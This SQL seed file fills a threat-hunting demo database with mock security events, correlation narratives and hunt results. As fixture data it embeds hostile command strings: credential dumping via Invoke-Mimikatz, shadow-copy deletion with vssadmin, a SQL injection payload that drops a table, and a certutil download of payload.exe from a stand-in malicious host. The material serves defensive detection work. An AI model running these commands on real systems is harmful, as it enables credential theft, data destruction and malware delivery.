/*
  # Add Mock Data for AI-Powered Threat Hunting

  1. Mock Data
    - Raw security events with realistic threat scenarios
    - Vector correlations with AI-detected patterns
    - Threat hunt queries with findings
    - Event clusters

  Note: Vector embeddings are simplified for demo purposes
*/

-- Insert mock raw security events with various threat scenarios
INSERT INTO raw_security_events (
  event_timestamp,
  raw_payload,
  event_summary,
  source_system,
  source_ip,
  destination_ip,
  event_type_detected,
  threat_indicators,
  similarity_cluster,
  processed
) VALUES
-- Lateral Movement Attack Chain (Cluster 1)
(
  NOW() - INTERVAL '2 hours',
  '{"event_type": "authentication", "action": "login_success", "user": "svc_backup", "source_host": "web01.dmz.corp", "target_host": "db01.prod.corp", "auth_method": "ntlm", "unusual": true, "service_account": true}'::jsonb,
  'Service account authenticated from web server to production database',
  'Windows Security',
  '10.1.1.10',
  '10.2.2.10',
  'authentication',
  '[{"type": "ip", "value": "10.1.1.10"}, {"type": "user", "value": "svc_backup"}]'::jsonb,
  1,
  true
),
(
  NOW() - INTERVAL '2 hours' + INTERVAL '5 minutes',
  '{"event_type": "network", "action": "smb_connection", "source_host": "db01.prod.corp", "target_host": "app01.prod.corp", "protocol": "smb", "port": 445, "suspicious": true}'::jsonb,
  'SMB connection from database server to application server',
  'Network IDS',
  '10.2.2.10',
  '10.2.1.10',
  'network',
  '[{"type": "ip", "value": "10.2.2.10"}, {"type": "port", "value": "445"}]'::jsonb,
  1,
  true
),
(
  NOW() - INTERVAL '2 hours' + INTERVAL '12 minutes',
  '{"event_type": "process", "action": "process_creation", "process": "powershell.exe", "command_line": "Invoke-Mimikatz", "parent_process": "services.exe", "suspicious_score": 95}'::jsonb,
  'PowerShell credential dumping tool executed on application server',
  'EDR',
  '10.2.1.10',
  null,
  'process',
  '[{"type": "process", "value": "powershell.exe"}, {"type": "technique", "value": "credential_dumping"}]'::jsonb,
  1,
  true
),

-- Data Exfiltration Pattern (Cluster 2)
(
  NOW() - INTERVAL '4 hours',
  '{"event_type": "file_access", "action": "bulk_read", "user": "john.doe", "file_count": 547, "data_volume": "2.3GB", "destination": "external", "time": "02:34 AM"}'::jsonb,
  'Bulk file access outside business hours - 547 files totaling 2.3GB',
  'DLP System',
  '10.4.1.50',
  '203.0.113.45',
  'file_access',
  '[{"type": "user", "value": "john.doe"}, {"type": "ip", "value": "203.0.113.45"}]'::jsonb,
  2,
  true
),
(
  NOW() - INTERVAL '4 hours' + INTERVAL '15 minutes',
  '{"event_type": "network", "action": "large_upload", "protocol": "https", "destination": "cloud-storage-unknown.com", "bytes": 2400000000, "duration": 840}'::jsonb,
  'Large HTTPS upload to unknown cloud storage service',
  'Firewall',
  '10.4.1.50',
  '198.51.100.89',
  'network',
  '[{"type": "domain", "value": "cloud-storage-unknown.com"}, {"type": "data_volume", "value": "2.4GB"}]'::jsonb,
  2,
  true
),

-- Ransomware Pre-Attack Indicators (Cluster 3)
(
  NOW() - INTERVAL '1 hour',
  '{"event_type": "system", "action": "shadow_copy_delete", "command": "vssadmin delete shadows /all /quiet", "user": "SYSTEM", "host": "fileserver.internal.corp"}'::jsonb,
  'Shadow copy deletion on file server - ransomware indicator',
  'Windows System',
  '10.3.1.10',
  null,
  'process',
  '[{"type": "command", "value": "vssadmin"}, {"type": "host", "value": "fileserver.internal.corp"}]'::jsonb,
  3,
  true
),
(
  NOW() - INTERVAL '1 hour' + INTERVAL '3 minutes',
  '{"event_type": "process", "action": "service_termination", "services": ["SQLWriter", "MSSQLSERVER", "postgresql"], "count": 3, "automated": true}'::jsonb,
  'Multiple database services terminated simultaneously',
  'Service Monitor',
  '10.3.1.10',
  null,
  'process',
  '[{"type": "host", "value": "fileserver.internal.corp"}, {"type": "action", "value": "service_kill"}]'::jsonb,
  3,
  true
),
(
  NOW() - INTERVAL '1 hour' + INTERVAL '7 minutes',
  '{"event_type": "file", "action": "mass_encryption", "files_modified": 1243, "rate": "178 files/min", "extensions": [".encrypted", ".locked"], "suspicious": true}'::jsonb,
  'Rapid file modification detected - 1243 files encrypted',
  'File Integrity Monitor',
  '10.3.1.10',
  null,
  'file_access',
  '[{"type": "malware", "value": "ransomware"}, {"type": "host", "value": "fileserver.internal.corp"}]'::jsonb,
  3,
  true
),

-- C2 Communication Beaconing (Cluster 4)
(
  NOW() - INTERVAL '6 hours',
  '{"event_type": "network", "action": "periodic_callback", "destination": "malicious-c2.xyz", "interval_seconds": 300, "consistency": 0.98, "encryption": true}'::jsonb,
  'Regular 5-minute beaconing to suspicious domain',
  'Network Monitor',
  '10.2.1.11',
  '192.0.2.200',
  'network',
  '[{"type": "domain", "value": "malicious-c2.xyz"}, {"type": "ip", "value": "192.0.2.200"}]'::jsonb,
  4,
  true
),
(
  NOW() - INTERVAL '5 hours' + INTERVAL '30 minutes',
  '{"event_type": "dns", "action": "dga_query", "domain": "xjk23kljsdf.com", "pattern": "random", "entropy_score": 0.94, "suspicious": true}'::jsonb,
  'High-entropy domain query suggesting domain generation algorithm',
  'DNS Monitor',
  '10.2.1.11',
  '8.8.8.8',
  'network',
  '[{"type": "domain", "value": "xjk23kljsdf.com"}, {"type": "technique", "value": "dga"}]'::jsonb,
  4,
  true
),

-- Privilege Escalation Attempts
(
  NOW() - INTERVAL '3 hours',
  '{"event_type": "authentication", "action": "privilege_escalation", "user": "contractor_user", "from_group": "Users", "to_group": "Domain Admins", "method": "token_manipulation", "success": false}'::jsonb,
  'Failed privilege escalation attempt via token manipulation',
  'AD Monitor',
  '10.4.1.60',
  '10.3.2.10',
  'authentication',
  '[{"type": "user", "value": "contractor_user"}, {"type": "technique", "value": "privilege_escalation"}]'::jsonb,
  5,
  true
),

-- SQL Injection Attack
(
  NOW() - INTERVAL '30 minutes',
  '{"event_type": "web_attack", "action": "sql_injection", "payload": "1 OR 1=1; DROP TABLE users;", "url": "/api/search", "blocked": true, "source_country": "CN"}'::jsonb,
  'SQL injection attempt blocked at API gateway',
  'WAF',
  '203.0.113.100',
  '10.1.1.20',
  'application',
  '[{"type": "ip", "value": "203.0.113.100"}, {"type": "attack", "value": "sqli"}]'::jsonb,
  null,
  true
),

-- Insider Threat - Unusual Access Pattern
(
  NOW() - INTERVAL '8 hours',
  '{"event_type": "data_access", "action": "database_query", "user": "analyst_user", "query_type": "SELECT", "rows_returned": 125000, "tables": ["customers", "credit_cards", "ssn"], "unusual_time": true}'::jsonb,
  'Large-scale customer data extraction outside normal work hours',
  'Database Audit',
  '10.4.1.55',
  '10.2.2.10',
  'database',
  '[{"type": "user", "value": "analyst_user"}, {"type": "data", "value": "pii"}]'::jsonb,
  null,
  true
),

-- Cryptocurrency Mining
(
  NOW() - INTERVAL '12 hours',
  '{"event_type": "process", "action": "suspicious_process", "process": "xmrig.exe", "cpu_usage": 98, "network_connections": ["pool.minexmr.com:3333"], "persistence": true}'::jsonb,
  'Cryptocurrency mining process detected with persistence',
  'EDR',
  '10.2.1.12',
  '45.32.100.50',
  'malware',
  '[{"type": "process", "value": "xmrig.exe"}, {"type": "malware", "value": "cryptominer"}]'::jsonb,
  null,
  true
),

-- Container Escape Attempt
(
  NOW() - INTERVAL '5 hours',
  '{"event_type": "container", "action": "escape_attempt", "container_id": "k8s_app_pod_123", "syscalls": ["mount", "pivot_root", "unshare"], "privilege_escalation": true, "host_access": true}'::jsonb,
  'Container attempting to access host filesystem and escalate privileges',
  'Kubernetes Security',
  '10.2.3.45',
  '10.2.3.1',
  'process',
  '[{"type": "container", "value": "k8s_app_pod_123"}, {"type": "technique", "value": "container_escape"}]'::jsonb,
  null,
  true
),

-- Phishing Campaign
(
  NOW() - INTERVAL '1 day',
  '{"event_type": "email", "action": "suspicious_attachment", "sender": "ceo@company-fake.com", "attachment": "invoice_urgent.docm", "macro_detected": true, "recipients": 47, "blocked": true}'::jsonb,
  'Mass phishing email with malicious macro intercepted',
  'Email Security',
  '198.51.100.150',
  '10.3.1.20',
  'malware',
  '[{"type": "email", "value": "ceo@company-fake.com"}, {"type": "malware", "value": "macro"}]'::jsonb,
  null,
  true
);

-- Insert mock vector correlations
INSERT INTO vector_correlations (
  rule_id,
  event_ids,
  correlation_type,
  similarity_score,
  attack_chain,
  threat_narrative,
  severity,
  investigated
) VALUES
(
  (SELECT id FROM vector_correlation_rules WHERE rule_name = 'Lateral Movement Detection' LIMIT 1),
  '["evt1", "evt2", "evt3"]'::jsonb,
  'multi_stage_attack',
  0.91,
  '[{"stage": 1, "action": "Initial compromise via service account", "timestamp": "2025-10-02T10:00:00Z"}, {"stage": 2, "action": "Lateral movement to database", "timestamp": "2025-10-02T10:05:00Z"}, {"stage": 3, "action": "Credential dumping on app server", "timestamp": "2025-10-02T10:12:00Z"}]'::jsonb,
  'Multi-stage lateral movement attack detected. Attacker compromised service account on web server, moved laterally to production database via SMB, then executed credential dumping tools on application server. This indicates an advanced persistent threat with clear objective of credential harvesting.',
  'critical',
  false
),
(
  (SELECT id FROM vector_correlation_rules WHERE rule_name = 'Data Exfiltration Pattern' LIMIT 1),
  '["evt4", "evt5"]'::jsonb,
  'behavioral_cluster',
  0.88,
  '[{"stage": 1, "action": "Bulk file access", "volume": "2.3GB"}, {"stage": 2, "action": "Upload to external cloud", "destination": "unknown"}]'::jsonb,
  'Data exfiltration pattern identified. User accessed 547 sensitive files during non-business hours totaling 2.3GB, immediately followed by large HTTPS upload to unknown cloud storage service. Classic insider threat or compromised account behavior.',
  'critical',
  false
),
(
  (SELECT id FROM vector_correlation_rules WHERE rule_name = 'Command and Control Communication' LIMIT 1),
  '["evt9", "evt10"]'::jsonb,
  'similarity_match',
  0.93,
  '[{"stage": 1, "action": "C2 beaconing established", "interval": "5 minutes"}, {"stage": 2, "action": "DGA domain queries", "entropy": "high"}]'::jsonb,
  'Advanced C2 infrastructure detected. Application server exhibiting periodic beaconing behavior with 5-minute intervals and high consistency (98%). Additional DGA-style domain queries suggest sophisticated malware with fallback C2 mechanisms.',
  'high',
  true
),
(
  null,
  '["evt6", "evt7", "evt8"]'::jsonb,
  'temporal_sequence',
  0.95,
  '[{"stage": 1, "action": "Shadow copy deletion", "time": "T+0"}, {"stage": 2, "action": "Database service termination", "time": "T+3min"}, {"stage": 3, "action": "Mass file encryption", "time": "T+7min"}]'::jsonb,
  'Ransomware attack in progress! Classic pre-encryption indicators detected in sequence: shadow copy deletion, database service termination, followed by rapid file encryption at 178 files per minute. Immediate isolation and incident response required.',
  'critical',
  false
);

-- Insert mock threat hunt queries with results
INSERT INTO threat_hunt_queries (
  query_name,
  natural_language_query,
  hunt_type,
  time_range_start,
  time_range_end,
  results_count,
  findings,
  status,
  hunter,
  completed_at
) VALUES
(
  'Unusual Admin Activity After Hours',
  'Find any administrative actions or privilege escalations that occurred outside normal business hours (6PM-8AM) over the past week',
  'semantic_search',
  NOW() - INTERVAL '7 days',
  NOW(),
  12,
  '[{"event": "Privilege escalation attempt", "time": "02:15 AM", "user": "contractor_user", "severity": "high"}, {"event": "Domain admin login", "time": "11:47 PM", "user": "it_admin", "severity": "medium"}]'::jsonb,
  'completed',
  'SOC Analyst',
  NOW() - INTERVAL '2 hours'
),
(
  'Potential Insider Threat Investigation',
  'Identify users who accessed sensitive data unrelated to their job function or downloaded unusually large amounts of data',
  'behavioral_hunt',
  NOW() - INTERVAL '30 days',
  NOW(),
  8,
  '[{"user": "analyst_user", "action": "Accessed 125K customer records", "normal_access": "~500 records", "anomaly_score": 0.94}, {"user": "john.doe", "action": "Downloaded 2.3GB at 2AM", "anomaly_score": 0.91}]'::jsonb,
  'completed',
  'Threat Hunter',
  NOW() - INTERVAL '1 day'
),
(
  'Living Off The Land Techniques',
  'Search for abuse of legitimate system tools like PowerShell, certutil, bitsadmin, or wmic with suspicious parameters',
  'pattern_hunt',
  NOW() - INTERVAL '14 days',
  NOW(),
  23,
  '[{"tool": "powershell.exe", "command": "Invoke-Mimikatz", "host": "app01.prod.corp"}, {"tool": "certutil.exe", "command": "-urlcache -split -f http://malicious.com/payload.exe", "host": "web02.dmz.corp"}]'::jsonb,
  'completed',
  'Senior Analyst',
  NOW() - INTERVAL '3 hours'
),
(
  'Cryptocurrency Mining Detection',
  'Find processes with high CPU usage connecting to known mining pools or blockchain networks',
  'anomaly_hunt',
  NOW() - INTERVAL '7 days',
  NOW(),
  5,
  '[{"process": "xmrig.exe", "cpu": "98%", "connection": "pool.minexmr.com", "host": "app-server-02"}]'::jsonb,
  'completed',
  'SOC Analyst',
  NOW() - INTERVAL '6 hours'
),
(
  'Cloud Resource Abuse',
  'Investigate unauthorized cloud resource provisioning or unusual API calls to cloud providers',
  'semantic_search',
  NOW() - INTERVAL '3 days',
  NOW(),
  0,
  '[]'::jsonb,
  'completed',
  'Cloud Security',
  NOW() - INTERVAL '1 hour'
);

-- Update statistics
UPDATE embedding_models
SET performance_metrics = '{"accuracy": 0.95, "speed": "fast", "cost": "low", "total_embeddings": 15, "avg_similarity": 0.87}'::jsonb
WHERE model_name = 'text-embedding-3-small';
